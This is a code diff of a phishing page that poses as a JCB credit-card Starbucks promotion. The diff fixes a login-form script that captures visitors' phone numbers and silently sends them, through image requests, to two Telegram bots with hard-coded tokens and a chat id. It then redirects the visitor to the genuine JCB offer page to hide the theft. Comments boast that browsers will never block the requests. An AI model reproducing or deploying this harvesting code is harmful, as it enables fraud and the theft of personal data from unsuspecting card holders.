@@ -59,7 +59,6 @@
         <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | <a href="https://www.jcb.co.jp/terms/">服務條款</a>
     </div>
 
-    <!-- 終極必中版：直接用 img 方式發送，瀏覽器永遠不會擋！ -->
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
@@ -70,11 +69,15 @@
             document.querySelector("button").textContent = "驗證中...";
 
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-            const msg = encodeURIComponent(2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${時間});
 
-            // 雙 token 同時用 img 方式觸發（瀏覽器絕對不會擋）
-            const img1 = new Image(); img1.src = https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=${msg};
-            const img2 = new Image(); img2.src = https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=1137905005&text=${msg};
+            // 修正重點：用反引號 + ${} 模板字面量
+            const msg = encodeURIComponent(`2025星巴克指定品項半價誘捕成功
+電話：${code}${phone}
+時間：${時間}`);
+
+            // 雙 token 同時發
+            new Image().src = https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=${msg};
+            new Image().src = https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=1137905005&text=${msg};
 
             setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
         });
